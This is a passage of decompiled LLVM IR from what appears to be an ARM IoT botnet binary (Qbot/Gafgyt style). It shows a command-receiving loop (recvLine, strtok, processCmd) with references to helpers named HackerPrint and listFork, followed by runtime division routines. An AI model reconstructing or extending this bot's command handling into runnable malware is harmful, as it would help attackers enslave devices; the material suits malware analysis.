  %v2_13b2c = load i8, i8* %stack_var_-36.043, align 1
  %v7_13b30 = icmp eq i8 %v2_13b2c, 10
  br i1 %v7_13b30, label %dec_label_pc_13bf0, label %dec_label_pc_13b38

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b28
  store i32 %stack_var_-40.141, i32* @r4, align 4
  %v3_13b44 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13b4c = add i32 %v3_13b44, 1
  %v1_13b54 = call i32 @malloc(i32 %v1_13b4c)
  %v0_13b64 = load i32, i32* @r4, align 4
  %v3_13b64 = mul i32 %v0_13b64, 4
  %v2_13b70 = add i32 %v2_13c50, %v3_13b64
  %v2_13b74 = inttoptr i32 %v2_13b70 to i32*
  store i32 %v1_13b54, i32* %v2_13b74, align 4
  %v3_13b80 = mul i32 %stack_var_-40.141, 4
  %v2_13b8c = add i32 %v2_13c50, %v3_13b80
  %v1_13b90 = inttoptr i32 %v2_13b8c to i32*
  %v2_13b90 = load i32, i32* %v1_13b90, align 4
  store i32 %v2_13b90, i32* @r4, align 4
  %v3_13b9c = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13ba4 = add i32 %v3_13b9c, 1
  %v0_13ba8 = load i32, i32* @r4, align 4
  store i32 %v1_13ba4, i32* @r2, align 4
  %v2_13bb4 = inttoptr i32 %v0_13ba8 to i8*
  %v3_13bb4 = call i32 @__GI_memset(i8* %v2_13bb4, i32 0)
  %v2_13bd0 = load i32, i32* %v1_13b90, align 4
  store i32 %stack_var_-36.043.in, i32* @r1, align 4
  %v3_13be0 = inttoptr i32 %v2_13bd0 to i8*
  %v4_13be0 = call i32 @strcpy(i8* %v3_13be0, i32 %stack_var_-36.043.in)
  %v1_13be8 = add i32 %stack_var_-40.141, 1
  br label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13b28, %dec_label_pc_13b38
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.141, %dec_label_pc_13b28 ], [ %v1_13be8, %dec_label_pc_13b38 ]
  %v2_13bf8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_24700.1311 to i32))
  %v2_13c08 = icmp eq i32 %v2_13bf8, 0
  br i1 %v2_13c08, label %dec_label_pc_13c10, label %dec_label_pc_13b28

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13bf0, %dec_label_pc_13afc
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_13afc ], [ %stack_var_-40.0, %dec_label_pc_13bf0 ]
  %v3_13c1c = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* %v2_13c1c)
  %v7_13c28 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13c28, label %dec_label_pc_13c80, label %dec_label_pc_13c40.lr.ph

dec_label_pc_13c40.lr.ph:                         ; preds = %dec_label_pc_13c10
  br label %dec_label_pc_13c40

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c40.lr.ph, %dec_label_pc_13c40
  %storemerge18115 = phi i32 [ 1, %dec_label_pc_13c40.lr.ph ], [ %v1_13c68, %dec_label_pc_13c40 ]
  %v3_13c48 = mul i32 %storemerge18115, 4
  %v2_13c54 = add i32 %v2_13c50, %v3_13c48
  %v1_13c58 = inttoptr i32 %v2_13c54 to i32*
  %v2_13c58 = load i32, i32* %v1_13c58, align 4
  store i32 %v2_13c58, i32* @r0, align 4
  %v0_13c60 = call i32 @free()
  %v1_13c68 = add nuw nsw i32 %storemerge18115, 1
  %v5_13c7c = icmp slt i32 %v1_13c68, %stack_var_-40.1.lcssa
  br i1 %v5_13c7c, label %dec_label_pc_13c40, label %dec_label_pc_13c80

dec_label_pc_13c80:                               ; preds = %dec_label_pc_13c40, %dec_label_pc_13a18, %dec_label_pc_13850, %dec_label_pc_13c10, %dec_label_pc_138ac, %dec_label_pc_13800, %dec_label_pc_13470
  %v2_13c84 = load i32, i32* @global_var_2e4e0.53, align 4
  %v5_13ca0 = call i32 @recvLine(i32 %v2_13c84, i8* %v4_13ca0, i32 4096, i32 %v2_13c90)
  %v3_13cb0 = icmp eq i32 %v5_13ca0, -1
  br i1 %v3_13cb0, label %dec_label_pc_13454, label %dec_label_pc_13728

; uselistorder directives
  uselistorder i32 %v5_13ca0, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v2_13bf8, { 1, 0 }
  uselistorder i8* %stack_var_-36.043, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.141, { 1, 3, 0, 2 }
  uselistorder i8* %v5_139f4, { 1, 0 }
  uselistorder i32 %v1_139f0, { 1, 0 }
  uselistorder i8* %storemerge936, { 1, 0 }
  uselistorder i32 %v1_139b8, { 1, 0 }
  uselistorder i32 %v1_13924, { 2, 1, 0 }
  uselistorder i8* %v5_138f4, { 5, 6, 0, 3, 2, 1, 4, 7, 9, 8 }
  uselistorder i32 %v1_138f0, { 0, 2, 1, 3 }
  uselistorder i8* %storemerge10, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_13764, { 1, 0 }
  uselistorder i32 %v3_13730, { 1, 0 }
  uselistorder i32 %storemerge16, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_13650, { 1, 0 }
  uselistorder i32 %v1_13634, { 1, 0 }
  uselistorder i32 %v1_13508, { 1, 2, 0, 3 }
  uselistorder i32 %v3_13524, { 1, 0 }
  uselistorder i32 %v2_13518, { 1, 0 }
  uselistorder i32 %v2_13c50, { 2, 0, 1 }
  uselistorder i32 %v2_13a30, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13ca0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13c90, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %v2_133f4, { 1, 0 }
  uselistorder i32 %v0_133dc, { 1, 0, 2, 3 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2e4e8.59, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_34748.62, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 11, 9, 10 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 0 }
  uselistorder i32* @global_var_2e4e0.53, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_3473c.481, { 1, 2, 0, 5, 3, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_13c80, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13c40, { 1, 0 }
  uselistorder label %dec_label_pc_13bf0, { 1, 0 }
  uselistorder label %dec_label_pc_13b28, { 1, 0 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
  uselistorder label %dec_label_pc_13ac4, { 1, 0 }
  uselistorder label %dec_label_pc_139cc, { 1, 0 }
  uselistorder label %dec_label_pc_139a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13998, { 1, 0 }
  uselistorder label %dec_label_pc_13920, { 1, 0 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
  uselistorder label %dec_label_pc_13850, { 1, 0 }
  uselistorder label %dec_label_pc_1379c, { 1, 0 }
  uselistorder label %dec_label_pc_1371c, { 1, 0 }
  uselistorder label %dec_label_pc_1368c, { 1, 0 }
  uselistorder label %dec_label_pc_1364c, { 1, 0 }
  uselistorder label %dec_label_pc_13558, { 1, 0 }
  uselistorder label %dec_label_pc_13514, { 1, 0 }
  uselistorder label %dec_label_pc_13454, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1343c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_132d8, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13d08 = load i32, i32* @r1, align 4
  %v1_13d08 = add i32 %v0_13d08, -1
  store i32 %v1_13d08, i32* %r2.global-to-local, align 4
  %v2_13d08 = icmp eq i32 %v0_13d08, 0
  %v7_13d08 = icmp eq i32 %v0_13d08, 1
  %v0_13d0c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_13d08, i32 %v0_13d0c)
  br i1 %v2_13d08, label %dec_label_pc_13df0, label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %entry
  %v0_13d14 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d14 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_13d14, %v1_13d14
  br i1 %tmp, label %dec_label_pc_13d1c, label %dec_label_pc_13da8

dec_label_pc_13d1c:                               ; preds = %dec_label_pc_13d14
  %v1_13d1c = load i32, i32* %r2.global-to-local, align 4
  %v2_13d1c = and i32 %v1_13d1c, %v1_13d14
  %v4_13d1c = icmp eq i32 %v2_13d1c, 0
  br i1 %v4_13d1c, label %dec_label_pc_13db4, label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %dec_label_pc_13d1c
  %v3_13d24 = icmp ult i32 %v1_13d14, 536870912
  br i1 %v3_13d24, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13d24
  %v4_13d28 = mul i32 %v1_13d14, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13d24, %.thread
  %v0_13d48.pr36.ph = phi i32 [ %v4_13d28, %.thread ], [ %v1_13d14, %dec_label_pc_13d24 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13d24 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_13d48.pr36 = phi i32 [ %v4_13d3c, %bb81 ], [ %v0_13d48.pr36.ph, %.preheader.preheader ]
  %v1_13d40 = phi i32 [ %v4_13d40, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_13d34 = icmp ugt i32 %v0_13d48.pr36, 268435455
  br i1 %v2_13d34, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13d48thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_13d38 = icmp ult i32 %v0_13d48.pr36, %v0_13d14
  br i1 %v4_13d38, label %bb80, label %dec_label_pc_13d48thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_13d3c = and i32 %v0_13d48.pr36, 268435456
  %v3_13d3c = icmp eq i32 %v2_13d3c, 0
  %v4_13d3c = mul i32 %v0_13d48.pr36, 16
  br i1 %v3_13d3c, label %bb81, label %dec_label_pc_13d48.loopexit

bb81:                                             ; preds = %bb80
  %v2_13d40 = and i32 %v1_13d40, 268435456
  %v3_13d40 = icmp eq i32 %v2_13d40, 0
  %v4_13d40 = mul i32 %v1_13d40, 16
  br i1 %v3_13d40, label %.preheader, label %dec_label_pc_13d48thread-pre-split.loopexit.loopexit

dec_label_pc_13d48thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_13d5448.ph = phi i32 [ %v1_13d40, %bb ], [ %v4_13d40, %bb81 ]
  %v0_13d48.pr38.ph = phi i32 [ %v0_13d48.pr36, %bb ], [ %v4_13d3c, %bb81 ]
  br label %dec_label_pc_13d48thread-pre-split.loopexit

dec_label_pc_13d48thread-pre-split.loopexit:      ; preds = %dec_label_pc_13d48thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13d5448 = phi i32 [ %v1_13d40, %.thread2 ], [ %v1_13d5448.ph, %dec_label_pc_13d48thread-pre-split.loopexit.loopexit ]
  %v0_13d48.pr38 = phi i32 [ %v0_13d48.pr36, %.thread2 ], [ %v0_13d48.pr38.ph, %dec_label_pc_13d48thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13d48thread-pre-split

dec_label_pc_13d48thread-pre-split:               ; preds = %dec_label_pc_13d48thread-pre-split.loopexit, %bb83
  %v1_13d5446 = phi i32 [ %v1_13d5448, %dec_label_pc_13d48thread-pre-split.loopexit ], [ %v3_13d54, %bb83 ]
  %v0_13d48.pr = phi i32 [ %v0_13d48.pr38, %dec_label_pc_13d48thread-pre-split.loopexit ], [ %v3_13d50, %bb83 ]
  br label %dec_label_pc_13d48

dec_label_pc_13d48.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d48.loopexit, %dec_label_pc_13d48thread-pre-split
  %v1_13d54 = phi i32 [ %v1_13d5446, %dec_label_pc_13d48thread-pre-split ], [ %v1_13d40, %dec_label_pc_13d48.loopexit ]
  %v1_13d50 = phi i32 [ %v0_13d48.pr, %dec_label_pc_13d48thread-pre-split ], [ %v4_13d3c, %dec_label_pc_13d48.loopexit ]
  %v2_13d48 = icmp slt i32 %v1_13d50, 0
  br i1 %v2_13d48, label %dec_label_pc_13d5c, label %bb82

bb82:                                             ; preds = %dec_label_pc_13d48
  %v4_13d4c = icmp ult i32 %v1_13d50, %v0_13d14
  br i1 %v4_13d4c, label %bb83, label %dec_label_pc_13d5c

bb83:                                             ; preds = %bb82
  %v3_13d50 = mul i32 %v1_13d50, 2
  %v2_13d54 = icmp slt i32 %v1_13d54, 0
  %v3_13d54 = mul i32 %v1_13d54, 2
  br i1 %v2_13d54, label %dec_label_pc_13d5c, label %dec_label_pc_13d48thread-pre-split

dec_label_pc_13d5c:                               ; preds = %bb82, %dec_label_pc_13d48, %bb83
  %v2_13d6859 = phi i32 [ %v3_13d54, %bb83 ], [ %v1_13d54, %bb82 ], [ %v1_13d54, %dec_label_pc_13d48 ]
  %v1_13d6051 = phi i32 [ %v3_13d50, %bb83 ], [ %v1_13d50, %bb82 ], [ %v1_13d50, %dec_label_pc_13d48 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %.thread11, %dec_label_pc_13d5c
  %v1_13d94 = phi i32 [ %v4_13d94, %.thread11 ], [ %v2_13d6859, %dec_label_pc_13d5c ]
  %v1_13d68 = phi i32 [ %v0_13da0, %.thread11 ], [ 0, %dec_label_pc_13d5c ]
  %v1_13d98 = phi i32 [ %v4_13d98, %.thread11 ], [ %v1_13d6051, %dec_label_pc_13d5c ]
  %v1_13d64 = phi i32 [ %v0_13d90, %.thread11 ], [ %v0_13d14, %dec_label_pc_13d5c ]
  %v3_13d60 = icmp ult i32 %v1_13d64, %v1_13d98
  br i1 %v3_13d60, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d60
  %v3_13d64 = sub i32 %v1_13d64, %v1_13d98
  store i32 %v3_13d64, i32* %r0.global-to-local, align 4
  %v3_13d68 = or i32 %v1_13d68, %v1_13d94
  store i32 %v3_13d68, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13d60, %bb84
  %v1_13d70 = phi i32 [ %v1_13d64, %dec_label_pc_13d60 ], [ %v3_13d64, %bb84 ]
  %v1_13d74 = phi i32 [ %v1_13d68, %dec_label_pc_13d60 ], [ %v3_13d68, %bb84 ]
  %v4_13d6c = udiv i32 %v1_13d98, 2
  %v6_13d6c = icmp ult i32 %v1_13d70, %v4_13d6c
  br i1 %v6_13d6c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_13d70 = urem i32 %v1_13d98, 2
  %v4_13d70 = icmp eq i32 %v3_13d70, 0
  %v6_13d70 = sub i32 %v1_13d70, %v4_13d6c
  store i32 %v6_13d70, i32* %r0.global-to-local, align 4
  br i1 %v4_13d70, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_13d74 = udiv i32 %v1_13d94, 2
  %v6_13d74 = or i32 %v1_13d74, %v5_13d74
  store i32 %v6_13d74, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_13d7c = phi i32 [ %v6_13d70, %bb85 ], [ %v1_13d70, %.thread7 ], [ %v6_13d70, %bb86 ]
  %v1_13d80 = phi i32 [ %v1_13d74, %bb85 ], [ %v1_13d74, %.thread7 ], [ %v6_13d74, %bb86 ]
  %v4_13d78 = udiv i32 %v1_13d98, 4
  %v6_13d78 = icmp ult i32 %v1_13d7c, %v4_13d78
  br i1 %v6_13d78, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_13d7c = and i32 %v1_13d98, 2
  %v4_13d7c = icmp eq i32 %v3_13d7c, 0
  %v6_13d7c = sub i32 %v1_13d7c, %v4_13d78
  store i32 %v6_13d7c, i32* %r0.global-to-local, align 4
  br i1 %v4_13d7c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13d80 = udiv i32 %v1_13d94, 4
  %v6_13d80 = or i32 %v1_13d80, %v5_13d80
  store i32 %v6_13d80, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_13d88 = phi i32 [ %v6_13d7c, %bb87 ], [ %v1_13d7c, %.thread8 ], [ %v6_13d7c, %bb88 ]
  %v1_13d8c = phi i32 [ %v1_13d80, %bb87 ], [ %v1_13d80, %.thread8 ], [ %v6_13d80, %bb88 ]
  %v4_13d84 = udiv i32 %v1_13d98, 8
  %v6_13d84 = icmp ult i32 %v1_13d88, %v4_13d84
  br i1 %v6_13d84, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_13d88 = and i32 %v1_13d98, 4
  %v4_13d88 = icmp eq i32 %v3_13d88, 0
  %v6_13d88 = sub i32 %v1_13d88, %v4_13d84
  store i32 %v6_13d88, i32* %r0.global-to-local, align 4
  br i1 %v4_13d88, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13d8c = udiv i32 %v1_13d94, 8
  %v6_13d8c = or i32 %v1_13d8c, %v5_13d8c
  store i32 %v6_13d8c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_13da0 = phi i32 [ %v1_13d8c, %bb89 ], [ %v1_13d8c, %.thread9 ], [ %v6_13d8c, %bb90 ]
  %v0_13d90 = phi i32 [ %v6_13d88, %bb89 ], [ %v1_13d88, %.thread9 ], [ %v6_13d88, %bb90 ]
  %v2_13d90 = icmp eq i32 %v0_13d90, 0
  br i1 %v2_13d90, label %dec_label_pc_13da0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_13d94, 16
  br i1 %tmp138, label %dec_label_pc_13da0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_13d94 = udiv i32 %v1_13d94, 16
  %v4_13d98 = udiv i32 %v1_13d98, 16
  br label %dec_label_pc_13d60

dec_label_pc_13da0:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_13da0, i32* %r0.global-to-local, align 4
  ret i32 %v0_13da0

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13d14
  %v9_13d14 = icmp eq i32 %v0_13d14, %v1_13d14
  %. = zext i1 %v9_13d14 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_13db4:                               ; preds = %dec_label_pc_13d1c
  %v2_13db4 = icmp ugt i32 %v1_13d14, 65535
  br i1 %v2_13db4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_13db4
  %v2_13db8 = and i32 %v1_13d14, 32768
  %v3_13db8 = icmp eq i32 %v2_13db8, 0
  %v4_13db8 = udiv i32 %v1_13d14, 65536
  br i1 %v3_13db8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_13db4
  %v0_13dc465 = phi i32 [ %v1_13d14, %dec_label_pc_13db4 ], [ %v4_13db8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_13dc8 = phi i32 [ %v0_13dc465, %.thread16 ], [ %v4_13db8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13dc4 = icmp ugt i32 %v1_13dc8, 255
  br i1 %v2_13dc4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_13dc8 = and i32 %v1_13dc8, 128
  %v3_13dc8 = icmp eq i32 %v2_13dc8, 0
  %v4_13dc8 = udiv i32 %v1_13dc8, 256
  br i1 %v3_13dc8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_13dcc = or i32 %storemerge, 8
  store i32 %v2_13dcc, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_13dd8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_13dcc, %bb98 ]
  %v1_13dd4 = phi i32 [ %v1_13dc8, %bb96 ], [ %v4_13dc8, %bb97 ], [ %v4_13dc8, %bb98 ]
  %v2_13dd0 = icmp ugt i32 %v1_13dd4, 15
  br i1 %v2_13dd0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_13dd4 = and i32 %v1_13dd4, 8
  %v3_13dd4 = icmp eq i32 %v2_13dd4, 0
  %v4_13dd4 = udiv i32 %v1_13dd4, 16
  br i1 %v3_13dd4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13dd8 = add nsw i32 %v1_13dd8, 4
  store i32 %v2_13dd8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_13de0 = phi i32 [ %v1_13dd8, %.thread17 ], [ %v1_13dd8, %bb99 ], [ %v2_13dd8, %bb100 ]
  %v5_13de4 = phi i32 [ %v1_13dd4, %.thread17 ], [ %v4_13dd4, %bb99 ], [ %v4_13dd4, %bb100 ]
  %v2_13ddc = icmp ugt i32 %v5_13de4, 3
  %v7_13ddc = icmp eq i32 %v5_13de4, 4
  %v2_13de0 = xor i1 %v7_13ddc, true
  %v3_13de0 = and i1 %v2_13ddc, %v2_13de0
  br i1 %v3_13de0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_13de0 = add nsw i32 %v4_13de0, 3
  store i32 %v5_13de0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_13de4 = phi i32 [ %v4_13de0, %.thread18 ], [ %v5_13de0, %bb101 ]
  %v2_13de4 = xor i1 %v2_13ddc, true
  %v3_13de4 = or i1 %v7_13ddc, %v2_13de4
  br i1 %v3_13de4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_13de4 = udiv i32 %v5_13de4, 2
  %v9_13de4 = add i32 %v4_13de4, %v8_13de4
  store i32 %v9_13de4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_13de8 = phi i32 [ %v4_13de4, %bb102 ], [ %v9_13de4, %bb103 ]
  %v6_13de8 = lshr i32 %v0_13d14, %v1_13de8
  store i32 %v6_13de8, i32* %r0.global-to-local, align 4
  ret i32 %v6_13de8

dec_label_pc_13df0:                               ; preds = %entry
  %v0_13df4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13de4, { 1, 0 }
  uselistorder i1 %v7_13ddc, { 1, 0 }
  uselistorder i32 %v4_13dd4, { 1, 0 }
  uselistorder i32 %v1_13dd4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13dcc, { 1, 0 }
  uselistorder i32 %v4_13dc8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13dc8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13db8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13d90, { 1, 0 }
  uselistorder i32 %v0_13da0, { 1, 0, 2 }
  uselistorder i32 %v4_13d84, { 1, 0 }
  uselistorder i32 %v1_13d8c, { 1, 2, 0 }
  uselistorder i32 %v4_13d78, { 1, 0 }
  uselistorder i32 %v1_13d80, { 1, 2, 0 }
  uselistorder i32 %v4_13d6c, { 1, 0 }
  uselistorder i32 %v1_13d74, { 1, 2, 0 }
  uselistorder i32 %v1_13d98, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13d68, { 1, 0 }
  uselistorder i32 %v1_13d94, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13d54, { 1, 0 }
  uselistorder i32 %v3_13d50, { 1, 0 }
  uselistorder i32 %v1_13d50, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13d54, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13d40, { 1, 0 }
  uselistorder i32 %v4_13d3c, { 2, 1, 0 }
  uselistorder i32 %v1_13d40, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13d48.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_13d14, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_13d14, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_13d08, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13da0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13d5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d48thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13e08 = udiv i32 %arg1, %arg2
  ret i32 %v2_13e08
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_13e24 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_13e24
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_13e40 = load i32, i32* @r0, align 4
  %v2_13e40 = icmp ugt i32 %v0_13e40, -4097
  br i1 %v2_13e40, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_13e40

bb1:                                              ; preds = %entry
  %v4_13e4c = icmp eq i32 %v0_13e40, -38
  br i1 %v4_13e4c, label %dec_label_pc_13e54, label %bb2

